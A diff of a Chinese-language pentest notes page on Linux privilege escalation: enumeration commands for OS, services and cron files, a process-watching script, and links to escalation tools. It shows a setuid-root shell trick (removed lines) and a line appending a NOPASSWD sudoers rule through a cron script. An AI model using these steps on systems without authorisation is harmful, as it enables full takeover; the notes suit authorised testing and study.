@@ -188,26 +188,97 @@ function sidebar_toggle() {
         <div class="book-content">
           <div class="book-post">
   <h1 id="Linux-提权">Linux 提权</h1>
-<h2 id="0-01-脚本三幻神">0.01 脚本三幻神</h2>
+<h4 id="枚举是关键">枚举是关键</h4>
+<p>收集 - 枚举，更多枚举和更多枚举。<br>
+处理 - 对收集的信息进行排序、分析和确定优先级。<br>
+搜索 - 知道要搜索什么以及在哪里可以找到漏洞利用代码。<br>
+定制 - 定制化 EXP，使其适合\可以使用。并非每个 EXP 对每个系统都是“开箱即用”的。<br>
+尝试 - 为（大量）反复试验做好准备。</p>
+<p><strong>信息收集、整理 - 找 EXP，修改到可以用 - 很难一次成功，需要大量的反复尝试</strong></p>
+<h2 id="0x01-脚本三幻神">0x01 脚本三幻神</h2>
 <p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a><br>
 <a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py</a><br>
 <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check</a></p>
-<h2 id="0-02-各种应用权限配置不当的利用方式">0.02 各种应用权限配置不当的利用方式</h2>
+<h2 id="0x02-各种应用权限配置不当的利用方式">0x02 各种应用权限配置不当的利用方式</h2>
 <p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
-<h3 id="命令执行-姿势拓展">命令执行 姿势拓展</h3>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果不能反弹 shell，别忘了 setuid</span>
-<span class="token function">chmod</span> <span class="token number">4755</span> /bin/dash
-dash
-<span class="token builtin class-name">cd</span> /root/</code></pre>
-<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 还可以现写命令执行</span>
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token comment">// 编译，一定要同目标机器环境一致</span>
-gcc exec<span class="token punctuation">.</span>c <span class="token operator">-</span>o exec<span class="token punctuation">;</span> chmod <span class="token number">755</span> exec<span class="token punctuation">;</span> <span class="token punctuation">.</span>exec</code></pre>
+<h2 id="0x03-Crontab-或者-各种-Schedule-等定时任务">0x03 Crontab 或者 各种 Schedule 等定时任务</h2>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检测后台定时任务</span>
+<span class="token comment"># 用那个啥来着</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检测定时任务 之 自制脚本 promon.sh</span>
+<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span>$<span class="token string">'<span class="token entity" title="\n">\n</span>'</span>
+<span class="token assign-left variable">op</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -eo <span class="token builtin class-name">command</span><span class="token variable">)</span></span>
+<span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token assign-left variable">np</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -eo <span class="token builtin class-name">command</span><span class="token variable">)</span></span>
+    <span class="token function">diff</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$op</span>"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$np</span>"</span><span class="token punctuation">)</span>
+    <span class="token function">sleep</span> .2
+    <span class="token assign-left variable">op</span><span class="token operator">=</span><span class="token variable">$np</span>
+<span class="token keyword">done</span></code></pre>
+<h2 id="枚举大法">枚举大法</h2>
+<h3 id="OS">OS</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 分配类型、版本</span>
+<span class="token function">cat</span> /etc/issue
+<span class="token function">cat</span> /etc/*-release
+<span class="token function">cat</span> /etc/lsb-release      <span class="token comment"># Debian based</span>
+<span class="token function">cat</span> /etc/redhat-release   <span class="token comment"># Redhat based</span>
+<span class="token comment"># 内核版本？64位？</span>
+<span class="token function">cat</span> /proc/version
+<span class="token function">uname</span> -a
+<span class="token function">uname</span> -mrs
+<span class="token function">rpm</span> -q kernel
+<span class="token function">dmesg</span> <span class="token operator">|</span> <span class="token function">grep</span> Linux
+<span class="token function">ls</span> /boot <span class="token operator">|</span> <span class="token function">grep</span> vmlinuz-
+<span class="token comment"># 环境变量里有啥</span>
+<span class="token function">cat</span> /etc/profile
+<span class="token function">cat</span> /etc/bashrc
+<span class="token function">cat</span> ~/.bash_profile
+<span class="token function">cat</span> ~/.bashrc
+<span class="token function">cat</span> ~/.bash_logout
+<span class="token function">env</span>
+<span class="token builtin class-name">set</span>
+<span class="token comment"># 这台是打印机吗？</span>
+lpstat -a</code></pre>
+<h3 id="APP、服务">APP、服务</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 正在运行哪些服务？哪个服务有哪个用户权限？</span>
+<span class="token function">ps</span> aux
+<span class="token function">ps</span> -ef
+<span class="token function">top</span>
+<span class="token function">cat</span> /etc/services
+<span class="token comment"># 找 root 权限的服务？哪些是易受攻击的？仔细检查！</span>
+<span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> root
+<span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> root
+<span class="token comment"># 安装了哪些应用程序？什么版本？正在运行？</span>
+<span class="token function">ls</span> -alh /usr/bin/
+<span class="token function">ls</span> -alh /sbin/
+dpkg -l
+<span class="token function">rpm</span> -qa
+<span class="token function">ls</span> -alh /var/cache/apt/archivesO
+<span class="token function">ls</span> -alh /var/cache/yum/
+<span class="token comment"># 哪些服务配置不当？是否附加了漏洞插件？</span>
+<span class="token function">cat</span> /etc/syslog.conf
+<span class="token function">cat</span> /etc/chttp.conf
+<span class="token function">cat</span> /etc/lighttpd.conf
+<span class="token function">cat</span> /etc/cups/cupsd.conf
+<span class="token function">cat</span> /etc/inetd.conf
+<span class="token function">cat</span> /etc/apache2/apache2.conf
+<span class="token function">cat</span> /etc/my.conf
+<span class="token function">cat</span> /etc/httpd/conf/httpd.conf
+<span class="token function">cat</span> /opt/lampp/etc/httpd.conf
+<span class="token function">ls</span> -aRl /etc/ <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'<span class="token variable">$1</span> ~ /^.*r.*/'</span>
+<span class="token comment"># 检查定时任务</span>
+<span class="token function">crontab</span> -l
+<span class="token function">ls</span> -alh /var/spool/cron
+<span class="token function">ls</span> -al /etc/ <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">cron</span>
+<span class="token function">ls</span> -al /etc/cron*
+<span class="token function">cat</span> /etc/cron*
+<span class="token function">cat</span> /etc/at.allow
+<span class="token function">cat</span> /etc/at.deny
+<span class="token function">cat</span> /etc/cron.allow
+<span class="token function">cat</span> /etc/cron.deny
+<span class="token function">cat</span> /etc/crontab
+<span class="token function">cat</span> /etc/anacrontab
+<span class="token function">cat</span> /var/spool/cron/crontabs/root
+
+</code></pre>
 <h2 id="0-03-配置不当">0.03 配置不当</h2>
 <h3 id="系统服务的错误权限配置漏洞">系统服务的错误权限配置漏洞</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/apache2/config.inc
@@ -217,6 +288,15 @@ gcc exec<span class="token punctuation">.</span>c <span class="token operator">-
 <h3 id="Crontab-或者-各种-Schedule-等定时任务">Crontab 或者 各种 Schedule 等定时任务</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检测后台定时任务</span>
 <span class="token comment"># 用那个啥来着</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检测定时任务 之 自制脚本 promon.sh</span>
+<span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span>$<span class="token string">'<span class="token entity" title="\n">\n</span>'</span>
+<span class="token assign-left variable">op</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -eo <span class="token builtin class-name">command</span><span class="token variable">)</span></span>
+<span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span>
+    <span class="token assign-left variable">np</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -eo <span class="token builtin class-name">command</span><span class="token variable">)</span></span>
+    <span class="token function">diff</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$op</span>"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$np</span>"</span><span class="token punctuation">)</span>
+    <span class="token function">sleep</span> .2
+    <span class="token assign-left variable">op</span><span class="token operator">=</span><span class="token variable">$np</span>
+<span class="token keyword">done</span></code></pre>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> user.sh
 <span class="token builtin class-name">echo</span> <span class="token string">"user ALL=(root) NOPASSWD: ALL"</span> <span class="token operator">>></span> /etc/sudoers</code></pre>
 <p><code>/etc/crontab</code> 中加入计划任务。</p>
